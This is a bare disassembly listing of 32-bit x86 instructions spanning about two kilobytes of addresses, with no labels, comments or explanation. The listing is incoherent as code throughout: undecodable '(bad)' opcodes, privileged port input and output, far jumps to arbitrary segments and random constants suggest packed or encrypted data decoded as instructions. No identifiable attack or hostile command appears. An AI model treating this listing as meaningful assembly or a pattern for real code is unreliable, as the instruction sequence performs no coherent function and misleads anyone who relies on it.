  41cbff:	fsubr  QWORD PTR [eax-0x2dc51d34]
  41cc05:	mov    al,0xe3
  41cc07:	mov    ch,0x57
  41cc09:	push   eax
  41cc0a:	cmp    al,0x75
  41cc0c:	add    DWORD PTR [ebp-0x35ada828],esp
  41cc12:	and    DWORD PTR [edi+0x1fd62a45],ecx
  41cc18:	repnz cmp DWORD PTR [ecx],ecx
  41cc1b:	paddusb mm7,QWORD PTR [ebp+0x2a]
  41cc1f:	or     ch,BYTE PTR [edi]
  41cc21:	jb     0x11ab7b59
  41cc27:	push   0x32ad4229
  41cc2c:	mov    ecx,0x27024e2
  41cc31:	cmp    edx,DWORD PTR ds:[edx+0x29479a75]
  41cc38:	xor    eax,0xbc63389a
  41cc3d:	ins    DWORD PTR es:[edi],dx
  41cc3e:	push   0x4d
  41cc40:	es mov ch,0x15
  41cc43:	and    dl,BYTE PTR [edi-0x67]
  41cc46:	jo     0x41cbd0
  41cc48:	outs   dx,DWORD PTR ds:[esi]
  41cc49:	sbb    DWORD PTR [ebx+0x664c641],esi
  41cc4f:	repz loope 0x41cca6
  41cc52:	lods   al,BYTE PTR ds:[esi]
  41cc53:	pusha  
  41cc54:	imul   eax,DWORD PTR [edx-0x72],0x9ff710ed
  41cc5b:	lock mov esi,0x8791c300
  41cc61:	js     0x41cc1f
  41cc63:	push   ds
  41cc64:	add    dh,BYTE PTR [edi]
  41cc66:	aas    
  41cc67:	call   0x33346d66
  41cc6c:	cdq    
  41cc6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc6e:	lea    edi,[ebx-0x20]
  41cc71:	mov    dl,0x72
  41cc73:	out    0xc8,eax
  41cc75:	pusha  
  41cc76:	sub    dl,BYTE PTR [ebx]
  41cc78:	jmp    0xfdb0:0xa9d2d1ee
  41cc7f:	shl    dl,cl
  41cc81:	adc    ebx,ebx
  41cc83:	pop    ebx
  41cc84:	and    DWORD PTR [ebp+0x43516914],eax
  41cc8a:	mov    esp,DWORD PTR [ebx+0x37]
  41cc8d:	dec    ebx
  41cc8e:	xchg   edi,eax
  41cc8f:	int3   
  41cc90:	or     edx,ecx
  41cc92:	jae    0x41ccb1
  41cc94:	mov    bh,0x20
  41cc96:	adc    BYTE PTR [eax],al
  41cc98:	enter  0xf004,0x1d
  41cc9c:	int3   
  41cc9d:	call   0x41f:0x37806d8b
  41cca4:	pop    ebp
  41cca5:	mov    ds:0xbb85e7c,eax
  41ccaa:	jnp    0x41cd19
  41ccac:	div    DWORD PTR [edx+0x31]
  41ccaf:	mov    BYTE PTR [ecx-0x6fb698ff],dl
  41ccb5:	sbb    bh,ah
  41ccb7:	ret    
  41ccb8:	(bad)  
  41ccb9:	test   bh,0xa7
  41ccbc:	je     0x41cc84
  41ccbe:	dec    ebx
  41ccbf:	push   esp
  41ccc0:	xchg   edi,eax
  41ccc1:	adc    DWORD PTR [eax+0x5cd22f84],esi
  41ccc7:	sub    al,0xe8
  41ccc9:	jg     0x41ccee
  41cccb:	ficomp DWORD PTR [eax+0x68404fbb]
  41ccd1:	cli    
  41ccd2:	or     bl,BYTE PTR [ebp-0x46fe4c6]
  41ccd8:	or     al,0xc7
  41ccda:	lds    esi,FWORD PTR [esi-0x67]
  41ccdd:	adc    eax,0x548dbfa6
  41cce2:	and    eax,0x31f92d80
  41cce7:	sub    BYTE PTR [ecx],ch
  41cce9:	mov    ecx,0xe5de2260
  41ccee:	test   eax,0xec877686
  41ccf3:	sbb    DWORD PTR [edi+0x16],ebx
  41ccf6:	xchg   ebx,eax
  41ccf7:	sbb    eax,DWORD PTR [eax-0x54db64a9]
  41ccfd:	or     eax,0xc2f281db
  41cd02:	ds dec edi
  41cd04:	fild   QWORD PTR [eax+0x693e64f0]
  41cd0a:	je     0x41cd8a
  41cd0c:	es adc eax,0x861f9db6
  41cd12:	cwde   
  41cd13:	pushf  
  41cd14:	stc    
  41cd15:	pop    ss
  41cd16:	or     ebp,DWORD PTR [edi+0x66]
  41cd19:	es (bad) 
  41cd1b:	test   BYTE PTR [ecx-0x66dc1d83],dl
  41cd21:	xchg   ecx,eax
  41cd22:	jae    0x41cd8a
  41cd24:	fldcw  WORD PTR [edx+0x2c]
  41cd27:	leave  
  41cd28:	xor    al,BYTE PTR [edx-0x78a3b79b]
  41cd2e:	mul    DWORD PTR [ebx]
  41cd30:	outs   dx,BYTE PTR ds:[esi]
  41cd31:	inc    edi
  41cd32:	push   esi
  41cd33:	push   0x60
  41cd35:	loopne 0x41cce7
  41cd37:	loop   0x41cd93
  41cd39:	mov    dl,0x2b
  41cd3b:	nop
  41cd3c:	dec    ebp
  41cd3d:	out    dx,eax
  41cd3e:	cmc    
  41cd3f:	cmp    al,0x4b
  41cd41:	add    al,dh
  41cd43:	push   es
  41cd44:	push   0xc688918a
  41cd49:	fucom  st(3)
  41cd4b:	mov    ch,0xab
  41cd4d:	(bad)  
  41cd4e:	sbb    eax,0xf8144a7
  41cd53:	mov    ds:0xbfbbffbe,eax
  41cd58:	shr    BYTE PTR [ecx-0x25],0x4
  41cd5c:	int    0xb1
  41cd5e:	pop    es
  41cd5f:	inc    edx
  41cd60:	add    eax,0xde094e5f
  41cd65:	add    BYTE PTR [ecx],al
  41cd67:	sub    bh,bh
  41cd69:	sbb    al,0x68
  41cd6b:	jge    0x41cdb9
  41cd6d:	cmp    dh,ah
  41cd6f:	or     DWORD PTR [ebx],edi
  41cd71:	add    al,0x64
  41cd73:	pop    esp
  41cd74:	pop    esi
  41cd75:	das    
  41cd76:	jbe    0x41cd8c
  41cd78:	pop    eax
  41cd79:	(bad)  
  41cd7b:	cmp    al,0xf2
  41cd7d:	push   ecx
  41cd7e:	not    DWORD PTR [ebp+0x15a71707]
  41cd84:	sub    edi,DWORD PTR [eax-0x2034a141]
  41cd8a:	nop
  41cd8b:	repz repnz sar BYTE PTR ss:[esi-0x64],cl
  41cd91:	push   esp
  41cd92:	cmc    
  41cd93:	mov    esp,0xf8f43569
  41cd98:	xchg   ecx,eax
  41cd99:	push   dx
  41cd9b:	cmp    al,0xbe
  41cd9d:	fsubr  QWORD PTR [ebp-0x79]
  41cda1:	push   cs
  41cda2:	ja     0x41cdf5
  41cda4:	fist   DWORD PTR [ebx]
  41cda6:	das    
  41cda7:	gs mov ecx,0xfcb2c0ac
  41cdad:	mov    ah,al
  41cdaf:	sbb    BYTE PTR [ecx+0x20],bl
  41cdb2:	add    BYTE PTR [ebp-0x30],bl
  41cdb5:	daa    
  41cdb6:	pop    ecx
  41cdb7:	shl    DWORD PTR [ebx-0x60],cl
  41cdba:	xlat   BYTE PTR ds:[bx]
  41cdbc:	cmp    al,0xef
  41cdbe:	out    0x0,eax
  41cdc0:	mov    esp,0x6ce4ce36
  41cdc5:	out    dx,eax
  41cdc6:	sub    al,0xc0
  41cdc8:	mov    dh,BYTE PTR [ebx+0x66ad0d82]
  41cdce:	test   BYTE PTR [eax+0x5d],dl
  41cdd1:	nop
  41cdd2:	xor    al,0x24
  41cdd4:	je     0x41ce26
  41cdd6:	jl     0x41ce02
  41cdd8:	xchg   ebx,eax
  41cdd9:	xor    cl,cl
  41cddb:	sbb    eax,0x67771af5
  41cde0:	leave  
  41cde1:	fld    TBYTE PTR [esi]
  41cde3:	inc    eax
  41cde4:	je     0x41cd76
  41cde6:	pop    ebp
  41cde7:	(bad)  
  41cde9:	retf   0x10ea
  41cdec:	inc    eax
  41cded:	out    0x54,eax
  41cdef:	daa    
  41cdf0:	fbld   TBYTE PTR [eax+0x6d]
  41cdf3:	daa    
  41cdf4:	mov    ah,0x78
  41cdf6:	xlat   BYTE PTR gs:[ebx]
  41cdf8:	(bad)  [ecx]
  41cdfa:	or     eax,0x8ccab6c3
  41cdff:	push   esp
  41ce00:	push   esp
  41ce01:	out    dx,al
  41ce02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce03:	jl     0x41cd86
  41ce05:	not    DWORD PTR [ecx+0x73]
  41ce08:	dec    ebx
  41ce09:	cmp    bl,BYTE PTR [ecx-0x7d]
  41ce0c:	xor    cl,dh
  41ce0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce0f:	sub    bl,ah
  41ce11:	pop    esp
  41ce12:	xor    DWORD PTR [edi-0x59d7c6ac],0x3234dbf8
  41ce1c:	frstor [esi]
  41ce1e:	rol    BYTE PTR [ebx-0x7b],cl
  41ce21:	fist   WORD PTR [ebx-0x4a38b0d9]
  41ce27:	pop    esi
  41ce28:	sar    DWORD PTR [ebx+ebp*8-0x6f],cl
  41ce2c:	mov    ah,0x31
  41ce2e:	test   BYTE PTR [edx],ah
  41ce30:	stc    
  41ce31:	dec    ebx
  41ce32:	mov    WORD PTR [eax+esi*2],ds
  41ce35:	pusha  
  41ce36:	test   eax,0x7dd3298b
  41ce3b:	mov    edx,0xa8c80a64
  41ce40:	(bad)  [edx+0x5ee87e7]
  41ce46:	std    
  41ce47:	test   BYTE PTR [ebx-0x6d],ch
  41ce4a:	arpl   WORD PTR [edx],cx
  41ce4c:	or     eax,0xb62ef930
  41ce51:	out    dx,al
  41ce52:	icebp  
  41ce53:	pop    ss
  41ce54:	arpl   WORD PTR [ecx-0x8],bp
  41ce57:	fsubr  DWORD PTR [esi+0x6eda2971]
  41ce5d:	(bad)  
  41ce5e:	aas    
  41ce5f:	xlat   BYTE PTR ds:[ebx]
  41ce60:	mov    esp,DWORD PTR [esi]
  41ce62:	cli    
  41ce63:	pop    ss
  41ce64:	call   0x8d39dc50
  41ce69:	jp     0x41ce3f
  41ce6b:	dec    esi
  41ce6c:	ret    0x8123
  41ce6f:	(bad)  
  41ce70:	test   eax,0xba71201e
  41ce75:	retf   0x9900
  41ce78:	mov    al,ds:0x847d579
  41ce7d:	and    ch,BYTE PTR [ebp-0x4935f985]
  41ce83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce84:	jmp    0xcfac51fe
  41ce89:	xor    bh,dh
  41ce8b:	loope  0x41ce55
  41ce8d:	test   ecx,ecx
  41ce8f:	cmp    eax,0xff1d62f4
  41ce94:	gs mov ch,0xf2
  41ce97:	ss mov edi,edx
  41ce9a:	adc    esp,DWORD PTR [eax]
  41ce9c:	daa    
  41ce9d:	dec    esp
  41ce9e:	shl    edi,cl
  41cea0:	test   al,0xbe
  41cea2:	mov    dl,0xd3
  41cea4:	call   0x5789:0x8ebd86c4
  41ceab:	repnz sbb eax,DWORD PTR [edx]
  41ceae:	sub    BYTE PTR [edi+0x31c5aa41],al
  41ceb4:	or     al,0x65
  41ceb6:	mov    BYTE PTR [ecx],0xed
  41ceb9:	xlat   BYTE PTR ds:[ebx]
  41ceba:	repz fsub st,st(0)
  41cebd:	cmc    
  41cebe:	popa   
  41cebf:	or     DWORD PTR [ebx],ecx
  41cec1:	mov    ds:0x6ae4b933,al
  41cec6:	add    eax,0xe359b0cf
  41cecb:	sahf   
  41cecc:	mov    es,edx
  41cece:	retf   0x8fa0
  41ced1:	push   ebp
  41ced2:	out    0x10,eax
  41ced4:	push   ecx
  41ced5:	mov    esp,0xdc2c2a61
  41ceda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cedb:	out    dx,al
  41cedc:	call   0x7ce8:0x4cb0d15e
  41cee3:	jnp    0x41cf3b
  41cee5:	shl    DWORD PTR [edx+0x515f8c28],1
  41ceeb:	test   eax,0x62f30fd1
  41cef0:	bound  edx,QWORD PTR [eax-0x36]
  41cef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cef4:	sub    bh,BYTE PTR [edi]
  41cef6:	mov    BYTE PTR [ebx],0xb8
  41cef9:	jmp    0x41cf67
  41cefb:	sub    eax,0xd099cc66
  41cf00:	fs sti 
  41cf02:	or     al,BYTE PTR [ecx+eiz*4+0x4869e8a9]
  41cf09:	mov    DWORD PTR [ebx+0x6934e8b0],edi
  41cf0f:	mov    bh,0x5b
  41cf11:	aas    
  41cf12:	icebp  
  41cf13:	jns    0x41cf6c
  41cf15:	push   ecx
  41cf16:	mov    cl,0x84
  41cf18:	inc    esp
  41cf19:	fnstenv [edi-0x14]
  41cf1c:	popa   
  41cf1d:	dec    ebx
  41cf1e:	sbb    edx,esp
  41cf20:	jnp    0x41cebd
  41cf22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf23:	jo     0x41cf23
  41cf25:	mov    eax,ds:0xe81bc9ed
  41cf2a:	ja     0x41ced9
  41cf2c:	pop    ebx
  41cf2d:	add    esp,DWORD PTR [ebp+0x442a6942]
  41cf33:	ds push ss
  41cf35:	into   
  41cf36:	retf   0xb36b
  41cf39:	mov    DWORD PTR [ecx+0x2cb0adbd],esi
  41cf3f:	js     0x41cf64
  41cf41:	ss mov edx,0x546bbd9
  41cf47:	loope  0x41cf6d
  41cf49:	mov    BYTE PTR [eax-0x5e],dl
  41cf4c:	aas    
  41cf4d:	xlat   BYTE PTR ds:[ebx]
  41cf4e:	mov    esi,0x8456b0f2
  41cf53:	jmp    0x5f5c:0x1f683f3
  41cf5a:	sar    BYTE PTR [esi+0x3557e0f],0x2d
  41cf61:	retf   0xa977
  41cf64:	adc    DWORD PTR [eax-0x695df8f0],ecx
  41cf6a:	and    ebx,DWORD PTR [edx+edx*2-0x1256f0de]
  41cf71:	xor    eax,0x7b6eab04
  41cf76:	mov    edx,DWORD PTR [ebp-0x4d]
  41cf79:	dec    esi
  41cf7a:	lods   al,BYTE PTR ds:[esi]
  41cf7b:	sub    ebp,DWORD PTR [edx+0x605d7262]
  41cf81:	loope  0x41cf5a
  41cf83:	pop    ebx
  41cf84:	nop
  41cf85:	cmp    ch,BYTE PTR [esi+0x69]
  41cf88:	pusha  
  41cf89:	mov    fs,WORD PTR [eax+0x7d959d15]
  41cf8f:	loop   0x41cf77
  41cf91:	and    edx,DWORD PTR [ecx]
  41cf93:	sti    
  41cf94:	pop    edx
  41cf95:	sub    ah,BYTE PTR [ebp+ebx*8-0x2f]
  41cf99:	ret    
  41cf9a:	push   ebp
  41cf9b:	mov    ecx,0x3406df4a
  41cfa0:	aaa    
  41cfa1:	adc    BYTE PTR [edx+0x1d088354],dl
  41cfa7:	call   FWORD PTR ds:[ebx-0x63]
  41cfab:	xchg   esi,eax
  41cfac:	jbe    0x41d01d
  41cfae:	push   cs
  41cfaf:	adc    al,0x10
  41cfb1:	sub    dh,ch
  41cfb3:	std    
  41cfb4:	stc    
  41cfb5:	jo     0x41cf54
  41cfb7:	aam    0x55
  41cfb9:	jno    0x41cfb3
  41cfbb:	jno    0x41cf96
  41cfbd:	retf   0x6549
  41cfc0:	cmp    DWORD PTR [ebx-0x14346c66],esi
  41cfc6:	fiadd  WORD PTR [ecx-0x2]
  41cfc9:	sub    BYTE PTR [edx+0x45],bl
  41cfcc:	(bad)  
  41cfcd:	pop    ebp
  41cfce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfcf:	addr16 cli 
  41cfd1:	ret    
  41cfd2:	cmc    
  41cfd3:	loopne 0x41cff8
  41cfd5:	jle    0x41cf5d
  41cfd7:	arpl   WORD PTR [edi+0x55],bx
  41cfda:	push   ecx
  41cfdb:	out    0x5e,al
  41cfdd:	and    ebp,DWORD PTR [ebx+0xb]
  41cfe0:	fcom   DWORD PTR [edi]
  41cfe2:	lahf   
  41cfe3:	xchg   ebx,eax
  41cfe4:	mov    ch,0xb8
  41cfe6:	xchg   ebp,eax
  41cfe7:	xchg   edi,eax
  41cfe8:	(bad)  
  41cfe9:	jmp    0xf7eb:0x1851982
  41cff0:	add    al,0x4e
  41cff2:	push   es
  41cff3:	mov    ebx,0xa7eed384
  41cff8:	or     bh,BYTE PTR [ebx+0x4d]
  41cffb:	mov    dl,0xee
  41cffd:	dec    esi
  41cffe:	mov    bh,0x9e
  41d000:	sar    BYTE PTR [edi],0x4c
  41d003:	loopne 0x41d03a
  41d005:	lock cli 
  41d007:	dec    ebx
  41d008:	pop    es
  41d009:	lods   al,BYTE PTR ds:[esi]
  41d00a:	cwde   
  41d00b:	or     eax,0x2b70150
  41d010:	cmp    edx,DWORD PTR [esi+0x47]
  41d013:	sub    edi,edx
  41d015:	xchg   esi,eax
  41d016:	jle    0x41d062
  41d018:	repnz pop esp
  41d01a:	jnp    0x41d039
  41d01c:	inc    eax
  41d01d:	shl    ch,1
  41d01f:	mov    esp,DWORD PTR [ebx+eiz*8-0x2c6bf4a]
  41d026:	test   al,0xb5
  41d028:	pop    ss
  41d029:	push   es
  41d02a:	mov    ecx,0x567ec668
  41d02f:	lahf   
  41d030:	out    dx,al
  41d031:	les    ebp,FWORD PTR [ebx]
  41d033:	push   ebx
  41d034:	stos   DWORD PTR es:[edi],eax
  41d035:	xor    ebp,edi
  41d037:	das    
  41d038:	inc    eax
  41d039:	je     0x41d03c
  41d03b:	(bad)  
  41d03c:	lods   eax,DWORD PTR ds:[esi]
  41d03d:	push   ebx
  41d03e:	mov    ch,0x4c
  41d040:	les    esp,FWORD PTR [eax+0x41]
  41d043:	arpl   WORD PTR ds:0xe1ed927b,sp
  41d049:	lahf   
  41d04a:	and    BYTE PTR [ecx],0x3d
  41d04d:	mov    eax,ds:0x63f001bc
  41d052:	repnz leave 
  41d054:	mov    ds:0x72d94e15,eax
  41d059:	jmp    0x7e63:0x8bea1f61
  41d060:	dec    edx
  41d061:	repnz popa 
  41d063:	stc    
  41d064:	cmp    edx,edi
  41d066:	and    ah,BYTE PTR [ecx]
  41d068:	(bad)  
  41d069:	mov    esi,0x8596a0da
  41d06e:	sahf   
  41d06f:	scas   al,BYTE PTR es:[edi]
  41d070:	je     0x41cfff
  41d072:	(bad)  
  41d073:	mov    esi,DWORD PTR gs:[edi-0x10]
  41d077:	jge    0x41d08a
  41d079:	mov    bl,0x68
  41d07b:	fisubr WORD PTR [esi+0x5d]
  41d07e:	loopne 0x41d0bf
  41d080:	cmp    dh,BYTE PTR [ecx]
  41d082:	jo     0x41d0cb
  41d084:	add    bl,BYTE PTR [esi+0x4991563c]
  41d08a:	ja     0x41d0f8
  41d08c:	in     eax,0xd2
  41d08e:	add    al,0xf0
  41d090:	call   0xedd8b83f
  41d095:	adc    DWORD PTR [ebx],ecx
  41d097:	sbb    al,0xee
  41d099:	adc    BYTE PTR [ebx+0x17],0xce
  41d09d:	push   cs
  41d09e:	push   es
  41d09f:	xchg   ebp,eax
  41d0a0:	add    ah,BYTE PTR gs:[edi]
  41d0a3:	pop    eax
  41d0a4:	fcmovnb st,st(2)
  41d0a6:	sahf   
  41d0a7:	mov    eax,0x84ed847b
  41d0ac:	jge    0x41d04d
  41d0ae:	xchg   esi,eax
  41d0af:	and    DWORD PTR [edi-0x2a],edx
  41d0b2:	sub    ecx,0x7d
  41d0b5:	imul   edi,DWORD PTR [ebp+0x1c0b41ee],0xa9cb45d9
  41d0bf:	adc    ecx,eax
  41d0c1:	jp     0x41d0a4
  41d0c3:	in     al,0x8a
  41d0c5:	adc    dl,BYTE PTR [ebx+eax*8+0x1c]
  41d0c9:	xchg   edi,eax
  41d0ca:	mov    al,ds:0x2fedd6cd
  41d0cf:	imul   eax,DWORD PTR [ecx-0x10],0x25
  41d0d3:	je     0x41d140
  41d0d5:	cmp    al,0x3a
  41d0d7:	or     eax,0xfa4864b7
  41d0dc:	jecxz  0x41d0a3
  41d0de:	jns    0x41d0c4
  41d0e0:	push   ds
  41d0e1:	mov    eax,ds:0x7943f727
  41d0e6:	cmc    
  41d0e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0e8:	stc    
  41d0e9:	dec    ecx
  41d0ea:	cwde   
  41d0eb:	into   
  41d0ec:	fstp   QWORD PTR [eax]
  41d0ee:	jmp    0x231fa082
  41d0f3:	jbe    0x41d0e9
  41d0f5:	jge    0x41d0cd
  41d0f7:	dec    ebx
  41d0f8:	lds    ebp,FWORD PTR [ecx+0x67]
  41d0fb:	push   edx
  41d0fc:	jmp    0x41d0f7
  41d0fe:	inc    edi
  41d0ff:	in     eax,dx
  41d100:	mov    bl,0x5d
  41d102:	movhps xmm4,QWORD PTR [edi+ecx*1+0x7b80ac1d]
  41d10a:	push   ecx
  41d10b:	stos   DWORD PTR es:[edi],eax
  41d10c:	outs   dx,DWORD PTR ds:[esi]
  41d10d:	mov    ecx,0x2c1add29
  41d112:	or     eax,0x2a031c51
  41d117:	dec    esp
  41d118:	ret    0x587b
  41d11b:	adc    eax,0x14d09119
  41d120:	popa   
  41d121:	jo     0x41d0fa
  41d123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d124:	xor    BYTE PTR [edx+0x44443e46],0x87
  41d12b:	mov    dh,0xe
  41d12d:	xor    BYTE PTR [edx+0x21fe5c60],dl
  41d133:	ffree  st(4)
  41d135:	push   ss
  41d136:	inc    edi
  41d137:	lds    edi,FWORD PTR [ebx-0x3a]
  41d13a:	jae    0x41d187
  41d13c:	add    al,0xd2
  41d13e:	sbb    eax,0x95a8cb8d
  41d143:	sti    
  41d144:	test   eax,0xf74ec935
  41d149:	xor    eax,0xdfa6398e
  41d14e:	in     eax,0x83
  41d150:	sbb    bh,dl
  41d152:	dec    edi
  41d153:	fild   DWORD PTR [ebp+0x48]
  41d156:	and    eax,0x7ffcd024
  41d15b:	sar    BYTE PTR [ebp+0x3e46a5f2],1
  41d161:	xor    eax,0x89e888ec
  41d166:	outs   dx,DWORD PTR ds:[esi]
  41d167:	fcomp  QWORD PTR [ebx]
  41d169:	xchg   ebp,eax
  41d16a:	mov    esi,0x17f51d31
  41d16f:	sub    cl,ch
  41d171:	jle    0x41d128
  41d173:	adc    DWORD PTR [ebp-0x22a8b464],ebp
  41d179:	push   ebx
  41d17a:	inc    esi
  41d17b:	xchg   ebx,eax
  41d17c:	in     eax,0x23
  41d17e:	dec    edx
  41d17f:	or     bh,0xf8
  41d182:	adc    DWORD PTR [ebx-0x708ef626],0xffffffee
  41d189:	fwait
  41d18a:	jo     0x41d1b2
  41d18c:	loopne 0x41d115
  41d18e:	jae    0x41d168
  41d190:	jp     0x41d128
  41d192:	je     0x41d1e0
  41d194:	xchg   ebp,eax
  41d195:	hlt    
  41d196:	stos   DWORD PTR es:[edi],eax
  41d197:	or     DWORD PTR ds:0xb933f02e,ebx
  41d19d:	loope  0x41d1b0
  41d19f:	or     BYTE PTR [esi],bl
  41d1a1:	outs   dx,DWORD PTR ds:[esi]
  41d1a2:	jb     0x41d214
  41d1a4:	pop    ds
  41d1a5:	mov    al,0xa5
  41d1a7:	cwde   
  41d1a8:	cmp    al,BYTE PTR [esi-0x6e]
  41d1ab:	outs   dx,DWORD PTR ds:[esi]
  41d1ac:	out    0x21,al
  41d1ae:	popa   
  41d1af:	sahf   
  41d1b0:	adc    al,0x45
  41d1b2:	sbb    DWORD PTR [ebx+0x3cf93c3a],edi
  41d1b8:	and    al,BYTE PTR ds:0x11f6b372
  41d1be:	mov    eax,ecx
  41d1c0:	add    BYTE PTR es:[esi],cl
  41d1c3:	jne    0x41d187
  41d1c5:	xchg   esi,eax
  41d1c6:	adc    al,0x58
  41d1c8:	cdq    
  41d1c9:	into   
  41d1ca:	add    dh,al
  41d1cc:	call   0x18de:0xe525063c
  41d1d3:	jle    0x41d23b
  41d1d5:	int    0x94
  41d1d7:	aam    0x70
  41d1d9:	lods   eax,DWORD PTR ds:[esi]
  41d1da:	lds    edx,FWORD PTR [ecx-0x21]
  41d1dd:	sar    bh,0xc5
  41d1e0:	xchg   esp,eax
  41d1e1:	sub    bl,BYTE PTR [edi+ecx*8]
  41d1e4:	in     eax,0x6d
  41d1e6:	or     eax,0xaa066965
  41d1eb:	dec    ecx
  41d1ec:	mov    esi,edi
  41d1ee:	repz out dx,al
  41d1f0:	adc    eax,0xa82153a9
  41d1f5:	pop    eax
  41d1f6:	loope  0x41d1f3
  41d1f8:	les    esi,FWORD PTR [edi]
  41d1fa:	pop    ds
  41d1fb:	js     0x41d1e2
  41d1fd:	fld    QWORD PTR [esi+0x28184b53]
  41d203:	arpl   WORD PTR [ecx],si
  41d205:	ja     0x41d20d
  41d207:	cmp    al,0x9b
  41d209:	xor    DWORD PTR [edi-0x21506db5],ebp
  41d20f:	sar    DWORD PTR [ebp-0x80],1
  41d212:	sar    DWORD PTR [edi+0x1c],0x48
  41d216:	and    eax,0xfda01279
  41d21b:	sahf   
  41d21c:	stos   DWORD PTR es:[edi],eax
  41d21d:	mov    eax,ds:0x2730e802
  41d222:	push   esi
  41d223:	test   al,0x98
  41d225:	pop    ds
  41d226:	in     al,0x6b
  41d228:	xchg   ebp,eax
  41d229:	les    ebx,FWORD PTR [esi]
  41d22b:	imul   eax,DWORD PTR [ebx+0x3a],0xffffffa3
  41d22f:	jne    0x41d256
  41d231:	daa    
  41d232:	pop    ds
  41d233:	mov    esp,cs
  41d235:	iret   
  41d236:	adc    ebp,DWORD PTR [ebp+0x1ccda95b]
  41d23c:	hlt    
  41d23d:	or     BYTE PTR [edi],dh
  41d23f:	pop    edi
  41d240:	add    eax,0x2d2b6c33
  41d245:	pop    ds
  41d246:	inc    edi
  41d247:	sbb    dl,dl
  41d249:	jg     0x41d1eb
  41d24b:	cdq    
  41d24c:	retf   
  41d24d:	sti    
  41d24e:	popa   
  41d24f:	dec    edi
  41d250:	stc    
  41d251:	and    edi,DWORD PTR [esi-0x9]
  41d254:	add    eax,0xffffffd5
  41d257:	fisub  WORD PTR [eax+esi*1+0x44]
  41d25b:	into   
  41d25c:	adc    cl,al
  41d25e:	add    eax,0xdb6eeae7
  41d263:	lods   al,BYTE PTR ds:[esi]
  41d264:	das    
  41d265:	sbb    BYTE PTR [eax],0xa5
  41d268:	out    dx,eax
  41d269:	xchg   esi,eax
  41d26a:	jmp    0x41d2ba
  41d26c:	mov    ecx,0x2b10bab9
  41d271:	jb     0x41d2c7
  41d273:	cmp    al,0x18
  41d275:	and    al,0xc9
  41d277:	ss in  al,0x7c
  41d27a:	clc    
  41d27b:	cli    
  41d27c:	add    ch,BYTE PTR [esi-0x66]
  41d27f:	adc    al,0xcb
  41d281:	mov    al,0x66
  41d283:	pop    ds
  41d284:	adc    DWORD PTR [edi+0x65],esp
  41d287:	cmp    eax,0xebc9d56b
  41d28c:	jne    0x41d302
  41d28e:	xchg   esp,eax
  41d28f:	rcl    DWORD PTR [edi],0x27
  41d292:	dec    ecx
  41d293:	or     eax,DWORD PTR ds:0xfce79827
  41d299:	jle    0x41d2ca
  41d29b:	fsubr  st,st(3)
  41d29d:	fld    TBYTE PTR [ebx-0x22cd6741]
  41d2a3:	das    
  41d2a4:	js     0x41d2b4
  41d2a6:	mov    esp,DWORD PTR [ebx+0x11bec302]
  41d2ac:	retf   
  41d2ad:	adc    al,0xce
  41d2af:	and    BYTE PTR [ebp-0x5b],bh
  41d2b2:	dec    eax
  41d2b3:	add    DWORD PTR [edi+0x1046b2ef],esi
  41d2b9:	das    
  41d2ba:	push   esi
  41d2bb:	mov    WORD PTR fs:[esi-0x1d],?
  41d2bf:	mov    ecx,0x3f92629a
  41d2c4:	cli    
  41d2c5:	jge    0x41d2d8
  41d2c7:	(bad)  
  41d2c8:	out    dx,eax
  41d2c9:	bound  edi,QWORD PTR [edi+ecx*2-0x8]
  41d2cd:	mov    ebx,0x8b66710d
  41d2d2:	out    dx,al
  41d2d3:	mov    esi,0xe188ef05
  41d2d8:	fisubr DWORD PTR [ebx]
  41d2da:	or     bh,dh
  41d2dc:	mov    ds:0xb190d5c9,al
  41d2e1:	out    0xb8,al
  41d2e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2e4:	xchg   esp,eax
  41d2e5:	popf   
  41d2e6:	test   eax,0x7516d78f
  41d2eb:	adc    BYTE PTR [ebx-0x53],bh
  41d2ee:	push   edx
  41d2ef:	cmp    al,BYTE PTR [ecx+0x39]
  41d2f2:	mov    bh,BYTE PTR [esi+edx*2+0x2f1709c6]
  41d2f9:	mov    edx,0x622a817
  41d2fe:	gs in  al,dx
  41d300:	pop    ecx
  41d301:	jmp    0xbc13:0x5b2c64c9
  41d308:	push   edx
  41d309:	adc    bl,bh
  41d30b:	add    esi,ecx
  41d30d:	mov    cl,BYTE PTR [ebx+0x2]
  41d310:	outs   dx,DWORD PTR ds:[esi]
  41d311:	xchg   ecx,eax
  41d312:	aaa    
  41d313:	sti    
  41d314:	test   eax,0xaa2f4a07
  41d319:	inc    esi
  41d31a:	cdq    
  41d31b:	fcomip st,st(4)
  41d31d:	clc    
  41d31e:	loopne 0x41d32f
  41d320:	mov    ebx,0x617f762e
  41d325:	mov    ebp,0xfbad4b84
  41d32a:	cwde   
  41d32b:	jb     0x41d2e2
  41d32d:	xor    eax,0x73a7ea4b
  41d332:	mov    ds:0xbe721a28,al
  41d337:	mov    ah,0x74
  41d339:	jle    0x41d376
  41d33b:	mov    esi,ds
  41d33d:	mov    esp,0x6080aed6
  41d342:	nop
  41d343:	mov    al,ds:0x9cc94717
  41d348:	dec    eax
  41d349:	fld    st(0)
  41d34b:	inc    ebx
  41d34c:	stos   DWORD PTR es:[edi],eax
  41d34d:	xor    eax,0x1846892a
  41d352:	cli    
  41d353:	xchg   ecx,eax
  41d354:	cmc    
  41d355:	mov    esp,0xe49f1404
  41d35a:	ins    DWORD PTR es:[edi],dx
  41d35b:	push   esp
  41d35c:	jl     0x41d3cb
  41d35e:	in     al,dx
  41d35f:	(bad)  [ecx+eax*4-0x5e]
  41d363:	adc    esi,DWORD PTR [edx-0x45]
  41d366:	jmp    0x3582f8f5
  41d36b:	pop    edx
  41d36c:	inc    esp
  41d36d:	repnz (bad) 
  41d36f:	push   es
  41d370:	push   edx
  41d371:	fisubr WORD PTR [edx+eax*4+0x179ceb77]
  41d378:	fsub   st(1),st
  41d37a:	pusha  
  41d37b:	inc    esp
